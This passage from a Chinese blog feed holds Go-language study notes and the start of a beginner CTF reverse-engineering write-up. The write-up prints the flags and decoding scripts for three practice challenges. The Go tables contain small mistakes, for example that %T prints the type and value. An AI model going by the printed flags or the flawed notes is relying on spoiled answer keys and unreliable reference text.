title="格式化字符串"></a>格式化字符串</h3><p>go字符串格式化符号</p><table><thead><tr><th>格式</th><th>描述</th></tr></thead><tbody><tr><td>%v</td><td>按值的本来值输出</td></tr><tr><td>%+v</td><td>在%v的基础上，对结构体字段名和值进行展开</td></tr><tr><td>%#v</td><td>输出go语言语法格式的值</td></tr><tr><td>%T</td><td>输出go语言语法格式的类型和值</td></tr><tr><td>%%</td><td>输出%本体</td></tr><tr><td>%b</td><td>整型以二进制方式显示</td></tr><tr><td>%o</td><td>整型以八进制方式显示</td></tr><tr><td>%d</td><td>整型以十进制方式显示</td></tr><tr><td>%x</td><td>整型以十六进制方式显示</td></tr><tr><td>%X</td><td>整型以十六进制、字母大写方式显示</td></tr><tr><td>%U</td><td>Unicode字符</td></tr><tr><td>%f</td><td>浮点数</td></tr><tr><td>%p</td><td>指针、十六进制方式显示</td></tr></tbody></table><figure class="highlight swift"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs swift">package main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br>type point <span class="hljs-class"><span class="hljs-keyword">struct</span> </span>&#123;<br>x, y int<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span>()</span> &#123;<br>p :<span class="hljs-operator">=</span> point&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;<br><br><span class="hljs-comment">//输出结构体的对象值</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%v<span class="hljs-subst">\n</span>&quot;</span>, p)<br><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%+v<span class="hljs-subst">\n</span>&quot;</span>, p)<br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%#v<span class="hljs-subst">\n</span>&quot;</span>, p)<br><br><span class="hljs-comment">//输出一个值得数据类型</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%T<span class="hljs-subst">\n</span>&quot;</span>, p)<br><br><span class="hljs-comment">//输出布尔类型</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%t<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-literal">false</span>)<br><br><span class="hljs-comment">//格式化整型，十进制来输出，%ld,%Ld长整型数据；%hd输出短整型</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%d<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-number">10</span>)<br><br><span class="hljs-comment">//二进制方式输出</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%b<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-number">10</span>)<br><br><span class="hljs-comment">//输出数值所对应的ascii字符</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%c<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-number">0x39</span>)<br><br><span class="hljs-comment">//十六进制方式输出</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%x<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-number">10</span>)<br><br><span class="hljs-comment">//输出浮点型数值</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%f<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-number">10.123</span>)<br><br><span class="hljs-comment">//科学计数法</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%e<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-number">123400000.0</span>)<br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%E<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-number">123400000.0</span>)<br><br><span class="hljs-comment">//输出基本的字符串</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%s<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-string">&quot;<span class="hljs-subst">\&quot;</span>string<span class="hljs-subst">\&quot;</span>&quot;</span>)<br><br><span class="hljs-comment">//输出带双引号的字符串</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%q<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-string">&quot;<span class="hljs-subst">\&quot;</span>string<span class="hljs-subst">\&quot;</span>&quot;</span>)<br><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%x<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-string">&quot;b1ackie&quot;</span>)<br><br><span class="hljs-comment">//输出一个指针的值</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;%p<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-operator">&amp;</span>p)<br><br><span class="hljs-comment">//使用%后面的数字来控制输出的宽度，默认输出是右对齐，左边加上空格</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;|%6d|%6d|<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-number">123</span>, <span class="hljs-number">456789</span>)<br><br><span class="hljs-comment">//输出宽度，同时指定浮点数</span><br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;|%5.2f|%5.2f|<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-number">1.2</span>, <span class="hljs-number">3.456</span>)<br>fmt.<span class="hljs-type">Printf</span>(<span class="hljs-string">&quot;|%4s|%4s|<span class="hljs-subst">\n</span>&quot;</span>, <span class="hljs-string">&quot;go&quot;</span>, <span class="hljs-string">&quot;good&quot;</span>)<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/4.png"></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>在go中不允许这样写</p><blockquote><p>func main</p><p>{</p><p>}</p></blockquote><p>只可以这样写</p><blockquote><p>func main{</p><p>}</p></blockquote><h2 id="Go数据类型"><a href="#Go数据类型" class="headerlink" title="Go数据类型"></a>Go数据类型</h2><p>Go语言按照类别有以下几种数据类型：</p><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>布尔型</td><td>布尔型的值只可以是常量true或者false。var b bool = true</td></tr><tr><td>数字类型</td><td>整型int和浮点型float32、float64，go支持整型和浮点型数字，并且支持复数，其中位的运算采用补码</td></tr><tr><td>字符串类型</td><td>字符串是一串固定长度的字符连接起来的字符序列。Go的字符串是由单个字节连接起来的。Go语言的字符串的字节使用UTF-8编码标识Unicode文本</td></tr><tr><td>派生类型</td><td>指针类型<br>数组类型<br>结构化类型<br>Channel类型<br>函数类型<br>切片类型<br>接口类型<br>Map类型</td></tr></tbody></table><h3 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h3><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>uint8</td><td>无符号8位整型（0到255）</td></tr><tr><td>uint16</td><td>无符号16位整型（0到65535）</td></tr><tr><td>uint32</td><td>无符号32位整型（0到4294967295）</td></tr><tr><td>uint64</td><td>无符号 64 位整型 (0 到 18446744073709551615)</td></tr><tr><td>int8</td><td>有符号 8 位整型 (-128 到 127)</td></tr><tr><td>int16</td><td>有符号 16 位整型 (-32768 到 32767)</td></tr><tr><td>int32</td><td>有符号 32 位整型 (-2147483648 到 2147483647)</td></tr><tr><td>int64</td><td>有符号 64 位整型 (-9223372036854775808 到 9223372036854775807)</td></tr></tbody></table><h3 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h3><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>float32</td><td>IEEE-754 32位浮点型数</td></tr><tr><td>float64</td><td>IEEE-754 64位浮点型数</td></tr><tr><td>complex64</td><td>32 位实数和虚数</td></tr><tr><td>complex128</td><td>64 位实数和虚数</td></tr></tbody></table><h3 id="其他数字类型"><a href="#其他数字类型" class="headerlink" title="其他数字类型"></a>其他数字类型</h3><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>byte</td><td>类似uint8</td></tr><tr><td>rune</td><td>类似int32</td></tr><tr><td>uint</td><td>32或64位</td></tr><tr><td>int</td><td>与int一样大小</td></tr><tr><td>uintptr</td><td>无符号整型，用于存放一个指针</td></tr></tbody></table><h2 id="Go语言变量"><a href="#Go语言变量" class="headerlink" title="Go语言变量"></a>Go语言变量</h2><p>Go变量名由字母、数字、下划线组成，其中首个字符不能是数字</p><p>声明变量是使用var关键字：</p><blockquote><p>var identifier type</p></blockquote><p>可以一次性声明多个变量：</p><blockquote><p>var identifier1, identifier2 type</p></blockquote><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a <span class="hljs-keyword">string</span> = <span class="hljs-string">&quot;b1ackie&quot;</span><br>fmt.Println(a)<br><span class="hljs-keyword">var</span> b, c <span class="hljs-keyword">int</span> = <span class="hljs-number">1</span>, <span class="hljs-number">2</span><br>fmt.Println(b, c)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/5.png"></p><h3 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h3><p>声明变量有几种方式</p><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>第一种，指定变量类型，如果没有初始化，则变量默认为零值。</p><blockquote><p>var v_name v_type</p><p>v_name = value</p></blockquote><p>零值就是变量没有做初始化时系统默认设置的值</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//声明一个变量并初始化</span><br><span class="hljs-keyword">var</span> a <span class="hljs-keyword">string</span> = <span class="hljs-string">&quot;b1ackie&quot;</span><br>fmt.Println(a)<br><br><span class="hljs-comment">//声明一个变量，没有初始化，为0值</span><br><span class="hljs-keyword">var</span> b <span class="hljs-keyword">int</span><br>fmt.Println(b)<br><br><span class="hljs-comment">//bool 的0值为false</span><br><span class="hljs-keyword">var</span> c <span class="hljs-keyword">bool</span><br>fmt.Println(c)<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/6.png"></p><ul><li>数值类型是0</li><li>布尔类型为false</li><li>字符串为空</li></ul><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>第二种，根据值自行判断变量类型</p><blockquote><p>var v_name = value</p></blockquote><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> str = <span class="hljs-string">&quot;string&quot;</span><br>fmt.Println(str)<br><br><span class="hljs-keyword">var</span> num = <span class="hljs-number">1</span><br>fmt.Println(num)<br><br><span class="hljs-keyword">var</span> flag = <span class="hljs-literal">true</span><br>fmt.Println(flag)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/7.png"></p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>第三种，使用<code>:=</code>声明变量</p><blockquote><p>v_name := value</p></blockquote><p><code>intValue := 1</code>相当于</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">var</span> intValue <span class="hljs-keyword">int</span><br>intValue = <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p><code>var str string = &quot;b1ackie&quot;</code>可以简写为<code>str := &quot;b1ackie&quot;</code></p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;b1ackie&quot;</span><br>fmt.Println(str)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="多变量声明"><a href="#多变量声明" class="headerlink" title="多变量声明"></a>多变量声明</h3><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">//这种方式写法一般用于声明全局变量</span><br><span class="hljs-keyword">var</span> (<br>a <span class="hljs-keyword">float32</span><br>b <span class="hljs-keyword">bool</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//类型相同多个变量，非全局变量</span><br><span class="hljs-keyword">var</span> num1, num2, num3 <span class="hljs-keyword">int</span><br><br><span class="hljs-comment">//自动判断变量类型</span><br><span class="hljs-keyword">var</span> int1, int2, int3 = <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span><br><span class="hljs-comment">//这种不带声明格式的只能在函数中出现</span><br>c, d := <span class="hljs-number">123</span>, <span class="hljs-string">&quot;hello&quot;</span><br>fmt.Println(a, b, c, d)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="Go语言常量"><a href="#Go语言常量" class="headerlink" title="Go语言常量"></a>Go语言常量</h2><p>常量是一个简单值的标识符，在程序运行时，不会被修改的量。</p><p>常量中的数据类型只可以是布尔型、数字型（整数型、浮点型和复数）和字符串型。</p><p>常量的定义格式：</p><blockquote><p>const identifier [type] = value</p></blockquote><p>也可以省略type，编译器可以根据变量的值来推断其类型</p><ul><li>显示类型定义：const a string = “b1ackie”</li><li>隐式类型定义：const a = “b1ackie”</li></ul><p>多个相同类型声明可以简写为：</p><blockquote><p>const num1, num2 = value1, value2</p></blockquote><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">const</span> length <span class="hljs-keyword">int</span> = <span class="hljs-number">10</span><br><span class="hljs-keyword">const</span> width <span class="hljs-keyword">int</span> = <span class="hljs-number">20</span><br><span class="hljs-keyword">var</span> area <span class="hljs-keyword">int</span><br>area = length * width<br>fmt.Printf(<span class="hljs-string">&quot;the area is %d\n&quot;</span>, area)<br><span class="hljs-keyword">const</span> a, b, c = <span class="hljs-number">1</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;b1ackie&quot;</span><br>fmt.Println(a, b, c)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/8.png"></p><h3 id="iota"><a href="#iota" class="headerlink" title="iota"></a>iota</h3><p>iota，特殊常量，可以认为是一个可以被编译器修改的常量。</p><p>iota在const关键字出现时将被重置为0，const中每新增一行常量声明将使iota计数一次。</p><p>iota可以被用作枚举值：</p><blockquote><p>const(</p><p>​    a = iota</p><p>​    b = iota</p><p>​    c = iota</p><p>)</p></blockquote><p>第一个iota等于0，每当iota在新的一行被使用时，它的值都会自动加1，所以a=0,b=1,c=2。</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">const</span> (<br>a = <span class="hljs-literal">iota</span><br>b<br>c<br>d = <span class="hljs-string">&quot;b1ackie&quot;</span><br>e<br>f = <span class="hljs-number">10</span><br>g<br>h = <span class="hljs-literal">iota</span><br>i<br>)<br><span class="hljs-built_in">println</span>(a, b, c, d, e, f, g, h, i)<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/9.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Go语言的结构&quot;&gt;&lt;a href=&quot;#Go语言的结构&quot; class=&quot;headerlink&quot; title=&quot;Go语言的结构&quot;&gt;&lt;/a&gt;Go语言的结构&lt;/h2&gt;&lt;p&gt;Go语言的基础组成有以下几部分&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;包声明&lt;/li&gt;
&lt;li&gt;引入包&lt;/li&gt;</summary>
      
    
    
    
    <category term="Go语言学习" scheme="https://b1ackie.cn/categories/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="Go语言" scheme="https://b1ackie.cn/tags/Go%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界RE-新手练习区</title>
    <link href="https://b1ackie.cn/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    <id>https://b1ackie.cn/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</id>
    <published>2021-11-03T10:30:12.000Z</published>
    <updated>2021-11-26T05:48:22.405Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Hello-CTF"><a href="#Hello-CTF" class="headerlink" title="Hello CTF"></a>Hello CTF</h2><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>先查壳，看到无壳，可以直接打开。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/1.png"></p><p>使用IDA打开，可以看到我们输入的被转为十六进制最终存储在了<code>v10</code>之中，然后和<code>v13</code>比较，我们可以看到这部分的值是</p><blockquote><p>437261636b4d654a757374466f7246756e</p></blockquote><p>那么只需要将这部分十六进制值转为字符就行了，就是flag。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/2.png"></p><h3 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> flag[] =<span class="hljs-string">&quot;\x43\x72\x61\x63\x6b\x4d\x65\x4a\x75\x73\x74\x46\x6f\x72\x46\x75\x6e&quot;</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, flag);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>得到flag</p><blockquote><p>CrackMeJustForFun</p></blockquote><h2 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h2><p>查看文件可以知道是32位的elf文件</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/3.png"></p><p>使用IDA打开，看到非常简短的main函数，前面会生成一个随机数，然后可以看到<code>str</code>是个数组，生产的随机数除以0xA的余数作为下标，来决定<code>puts</code>函数输出什么。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/4.png"></p><p>看一下<code>str</code>数组，可以看到flag就在其中，第一个就是flag，当然如果运气好，随机数正好是0xA的倍数也可以自己输出flag。</p><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/5.png"></p><blockquote><p>9447{This_is_a_flag}</p></blockquote><h2 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h2><h3 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h3><p>是一个pyc文件，在网上找一个反编译pyc的网站，查看反编译后的Python代码。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit https://tool.lu/pyc/ for more information</span><br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span>(<span class="hljs-params">message</span>):</span><br>    s = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> message:<br>        x = <span class="hljs-built_in">ord</span>(i) ^ <span class="hljs-number">32</span><br>        x = x + <span class="hljs-number">16</span><br>        s += <span class="hljs-built_in">chr</span>(x)<br>    <br>    <span class="hljs-keyword">return</span> base64.b64encode(s)<br><br>correct = <span class="hljs-string">&#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Input flag:&#x27;</span><br>flag = raw_input()<br><span class="hljs-keyword">if</span> encode(flag) == correct:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;correct&#x27;</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;wrong&#x27;</span><br></code></pre></div></td></tr></table></figure><p>根据python代码写出注册机，算出flag</p><h3 id="注册机-1"><a href="#注册机-1" class="headerlink" title="注册机"></a>注册机</h3><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">&quot;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&quot;</span><br>flag = b64decode(flag)<br>s= <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    i = (i - <span class="hljs-number">16</span>) ^ <span class="hljs-number">32</span><br>    s += <span class="hljs-built_in">chr</span>(i)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CRE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/6.png"></p><h4 id="C"><a href="#C" class="headerlink" title="C"></a>C</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span 